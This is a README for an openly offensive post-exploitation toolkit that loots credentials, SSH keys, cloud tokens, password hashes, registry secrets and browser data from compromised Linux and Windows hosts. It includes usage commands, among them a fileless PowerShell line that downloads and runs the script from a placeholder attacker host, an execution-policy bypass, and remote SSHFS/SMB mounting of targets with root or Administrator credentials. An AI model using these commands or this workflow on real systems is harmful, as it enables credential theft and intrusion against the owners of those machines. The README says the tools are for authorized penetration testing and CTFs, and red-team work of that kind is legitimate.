# Loot Goblins

Post-exploitation looting and secrets scanning scripts. Bash and Powershell scripts to run on the host locally as well as remote looting scripts that use sshfs for looting Linux and SMB Drive mounting for looting a Windows machine. 

---

## Scripts

### `loot.sh` — Linux Post-Exploitation Looting
Comprehensive bash looting script for Linux targets. Run it on a compromised host to collect and stage sensitive data into a local output directory.

**Collects:**
- Home directories, shell histories, SSH keys and configs
- Credentials: `.netrc`, `.pgpass`, `.my.cnf`, `.git-credentials`, `.npmrc`
- Cloud credentials: AWS, GCP, Azure, Kubernetes kubeconfig, Docker config
- Database configs and connection strings
- Web app configs (nginx, apache, PHP, `.env` files)
- System files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/crontab`
- Container/K8s artifacts, CI/CD configs (Jenkins, GitLab, Drone)
- Network info, running services, listening ports
- Privesc artifacts: SUID/SGID binaries, writable cron jobs, sudo rules
- Certificates, backups, and log snippets

**Usage:**
```bash
./loot.sh [output_dir]
# Output defaults to /tmp/.loot_<timestamp>
```

---

### `loot.ps1` — Windows Post-Exploitation Looting
PowerShell equivalent of `loot.sh` for compromised Windows hosts. Collects credentials, registry keys, AD recon data, and more into a structured output directory.

**Collects:**
- Saved credentials: Windows Credential Manager, DPAPI blobs
- Registry: SAM, LSA secrets, WinLogon autologon creds, RDP saved creds
- Cloud credentials: AWS CLI, Azure CLI, GCP SDK, kubectl
- Browser data (Chrome, Firefox, Edge)
- Active Directory recon: domain users, groups, DCs, GPOs, ACLs
- Container/WSL artifacts, SSH keys
- Network config, ARP cache, firewall rules
- Installed software, scheduled tasks, services, event logs
- Privesc artifacts: AlwaysInstallElevated, unquoted service paths, writable services
- Generates a `HITS_SUMMARY.txt` for quick triage of notable findings

**Usage:**
```powershell
# Run as current user
.\loot.ps1

# Custom output directory
.\loot.ps1 -OutputDir C:\Users\Public\loot

# Run in-memory (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/loot.ps1')

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File .\loot.ps1
```

---

### `ssh_linux_secrets_scan.sh` — Remote Linux Secrets Scanner (SSHFS + NoseyParker)
Runs from your attack box against a remote Linux target. Mounts the target's filesystem read-only via SSHFS, then runs [NoseyParker](https://github.com/praetorian-inc/noseyparker) to find secrets. Supports single or multi-target mode.

**Features:**
- Three scan modes: `--quick` (home/root/etc only), `--targeted` (high-value dirs, default), `--full` (entire filesystem)
- Pre-scan pulls known high-value files directly via SSH before mounting (catches things SSHFS might miss)
- Outputs human-readable, JSON, and optional SARIF reports
- Generates a `HIGHLIGHTS.txt` summary of the most critical findings
- Supports password auth (`sshpass`) or key auth
- Multi-target mode via `--target-file`

**Requirements:**
```bash
sudo apt install sshfs sshpass
# NoseyParker: https://github.com/praetorian-inc/noseyparker/releases
```

**Usage:**
```bash
# Key auth
./ssh_linux_secrets_scan.sh -t 192.168.1.50 -u root -k ~/.ssh/id_rsa

# Password auth, full scan
./ssh_linux_secrets_scan.sh -t 192.168.1.50 -u root -p 'P@ssw0rd' --full

# Multiple targets
./ssh_linux_secrets_scan.sh --target-file targets.txt -u root -k ~/.ssh/id_rsa

# Mount only, no scan (manual inspection)
./ssh_linux_secrets_scan.sh -t 192.168.1.50 -u root -k ~/.ssh/id_rsa --no-scan --keep-mount
```

---

### `windows_secrets_scan.sh` — Remote Windows Secrets Scanner (SMB + NoseyParker)
Minimal script that mounts a Windows share (`C$`) via CIFS/SMB and runs NoseyParker against it from your Linux attack box.

**Requirements:**
```bash
sudo apt install cifs-utils
# NoseyParker: https://github.com/praetorian-inc/noseyparker/releases
```

**Usage:**
```bash
./windows_secrets_scan.sh <TARGET_IP> <USERNAME> <PASSWORD>
# Example:
./windows_secrets_scan.sh 192.168.1.100 Administrator 'P@ssw0rd'
```

Skips `Windows\`, `Program Files\`, and `Program Files (x86)\` to focus on user data and app configs. Outputs human and JSON reports.

---

## Workflow

```
Compromise host
      │
      ├─ Linux target ──► loot.sh (on target) or ssh_linux_secrets_scan.sh (remote)
      │
      └─ Windows target ► loot.ps1 (on target) or windows_secrets_scan.sh (remote SMB)
```

> **Note:** For authorized penetration testing and CTF use only.
